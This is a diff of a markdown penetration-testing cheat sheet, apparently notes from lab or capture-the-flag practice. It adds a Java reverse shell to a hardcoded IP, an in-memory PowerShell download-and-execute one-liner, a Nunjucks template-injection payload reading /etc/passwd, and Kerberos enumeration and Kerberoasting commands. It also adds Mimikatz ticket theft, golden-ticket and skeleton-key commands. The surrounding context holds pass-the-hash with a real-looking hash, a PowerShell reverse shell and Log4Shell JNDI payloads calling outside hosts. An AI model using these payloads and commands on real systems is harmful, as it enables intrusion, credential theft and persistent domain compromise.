@@ -55,7 +55,16 @@ powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/rev.exe' -OutFile 
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/winPEAS.bat' -OutFile 'c:\Windows\Temp\lin.bat'"
 ```
 
-# EVIl WinRM
+``` powershell
+Get-SmbShare
+```
+
+# WinPeas in memory
+``` powershell
+IEX(New-Object Net.WebClient).DownloadString('http://...')
+```
+
+# EVIL WinRM
 Pass the hash:
 ``` bash
 evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc
@@ -66,6 +75,11 @@ Generate hash from files
 ``` bash
 /path/other/xls2john excel.xls
 zip2john zipfile.zip
+```
+
+Remove spaces and newlines:
+``` bash
+echo -n "$hash$xyz" | cut -d "-" -f 1 > hash.txt
 ```
 
 ## cracking hashes
@@ -159,7 +173,7 @@ sqlmap -R request.txt --batch --random-refer
 # WPSCAN
 ## enumerate plugins, themes etc
 ``` bash
-wpscan --url http://domain -e vp
+wpscan --url http://domain -e vp,dbe,cb
 ```
 
 # REVERSE SHELL
@@ -213,6 +227,19 @@ echo "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$str
 # LOCAL FILE INCLUSION (PHP)
 ``` bash
 php://filter/convert.base64-encode/resource=/etc/passwd
+```
+
+``` bash
+String host="192.18.28.2";
+int port=4444;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+# Server side template injection
+Nunjucks/Express:
+``` javascript
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
 ```
 
 # MONGODB
@@ -270,6 +297,65 @@ curl 'http://TARGET:8983/?foo=${jndi:ldap://YOUR.IP:1389/Exploit\}'
 ``` text
 ${jndi:${lower:l}${lower:d}a${lower:p}://xx.interactsh.com/poc}
 ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.interactsh.com/poc}
+```
+
+# ENUM4LINUX
+``` bash
+enum4linux 10.10.82.233
+```
+
+# SMBCLIENT
+``` bash
+smbclient \\\\ip\\nt4wrksv
+```
+
+# WINDOWS
+Kerbrute: https://github.com/ropnop/kerbrute
+``` bash
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+```
+
+Impacket: https://github.com/SecureAuthCorp/impacket
+``` bash
+python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
+```
+
+## PowerView
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+``` powershell
+Get-NetUser | select cn
+Get-NetGroup -GroupName *admin*
+```
+
+# MIMIKATZ
+mimikatz.exe, `privilege::debug` = 20?
+Export ticket:
+``` bash
+sekurlsa::tickets /export
+```
+
+Pass the ticket:
+``` mimikatz
+kerberos::ptt <ticket>
+```
+``` cmd
+exit
+klist
+dir \\ip\admin$
+```
+Golden/silver ticket:
+``` mimikatz
+lsadump::lsa /inject /name:krbtgt
+Kerberos::golden /user:Administrator /domain:controller.local /sid:$SID /krbtgt:$NTLM /id:$USERID
+```
+Golden/silver ticket to access other machines:
+``` mimikatz
+misc::cmd
+```
+
+Skeleton key (every User-PW: mimikatz):
+``` mimikatz
+misc::skeleton
 ```
 
 # XSS
